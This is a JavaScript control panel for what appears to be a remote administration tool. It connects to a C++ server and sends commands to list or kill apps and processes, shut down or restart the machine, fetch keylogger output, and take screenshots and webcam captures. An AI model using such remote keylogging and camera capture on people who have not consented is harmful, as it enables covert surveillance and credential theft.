let SERVER_IP = ""; 
const PORT = 6969;

// Hàm hiển thị thông báo (Toast)
function showToast(msg, type = "success") {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `<i class="fa-solid ${type === 'error' ? 'fa-circle-exclamation' : 'fa-check'}"></i> ${msg}`;
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideIn 0.3s reverse';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// Hàm gửi request tới C++ Server
async function sendRequest(route) {
    if (!SERVER_IP) {
        showToast("You need to connect to the server first.", "error");
        return null;
    }

    try {
        const url = `http://${SERVER_IP}:${PORT}${route}`;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout 5s

        const response = await fetch(url, { 
            method: 'GET',
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`Server Error: ${response.status}`);
        }
        return await response.text();
    } catch (e) {
        console.error(e);
        showToast(`Error: ${e.message}`, "error");
        return null;
    }
}

// --- LOGIC KẾT NỐI ---
document.getElementById('btnConnect').addEventListener('click', async () => {
    const ipInput = document.getElementById('ipInput').value.trim();
    if (!ipInput) return showToast("Please enter IP!", "error");

    // Thử ping
    SERVER_IP = ipInput; 
    const res = await sendRequest('/ping');
    
    if (res) {
        showToast("Connected successfully!");
        document.getElementById('connectStatus').innerHTML = `Connected: <span style="color:var(--success)">${SERVER_IP}</span>`;
        document.getElementById('connectionPanel').style.display = 'none'; // Ẩn panel kết nối
        document.getElementById('disconnectPanel').style.display = 'flex'; // Hiện nút disconnect
    } else {
        SERVER_IP = ""; // Reset nếu lỗi
    }
});

document.getElementById('btnDisconnect').addEventListener('click', () => {
    SERVER_IP = "";
    document.getElementById('connectStatus').innerHTML = "Status: Disconnected";
    document.getElementById('connectionPanel').style.display = 'flex';
    document.getElementById('disconnectPanel').style.display = 'none';
    showToast("Disconnected.");
});

// --- LOGIC GỬI LỆNH TỪNG TRANG ---

// 1. Applications
async function sendCommand(cmd) {
    let route = "";
    
    // Map command sang route
    if (cmd === 'listApp') route = '/apps';
    else if (cmd === 'listProcess') route = '/processes';
    else if (cmd === 'startApp') {
        const name = document.getElementById('appName').value;
        if (!name) return showToast("Please enter app name!", "error");
        route = `/apps/start?name=${encodeURIComponent(name)}`;
    }
    else if (cmd === 'stopApp') {
        const name = document.getElementById('appName').value;
        if (!name) return showToast("Please enter app name!", "error");
        route = `/apps/stop?name=${encodeURIComponent(name)}`;
    }
    else if (cmd === 'stopProcess') {
        const pid = document.getElementById('processName').value;
        if (!pid) return showToast("Please enter PID or process name!", "error");
        route = `/processes/stop?name=${encodeURIComponent(pid)}`;
    }
    else if (cmd === 'shutdown') route = '/shutdown';
    else if (cmd === 'restart') route = '/restart';
    else if (cmd === 'getKeylog') route = '/keylogger/get';

    else if (cmd === 'screenshot') route = '/screenshot';
    else if (cmd === 'webcam') route = '/webcam';

    // Gửi request
    const result = await sendRequest(route);
    
    if (result) {
        if (cmd === 'listApp') {
            document.getElementById('appList').innerHTML = result;
            showToast("App list updated.");
        } 
        else if (cmd === 'listProcess') {
            document.getElementById('processList').innerHTML = result;
            showToast("Processes list updated");
        }
        else if (cmd === 'getKeylog') {
            document.getElementById('keylogResult').innerText = result || "No data fetched...";
        }
        else {
            // Các lệnh hành động (Start/Stop) thường trả về text thông báo
            showToast(result);
        }
    }
}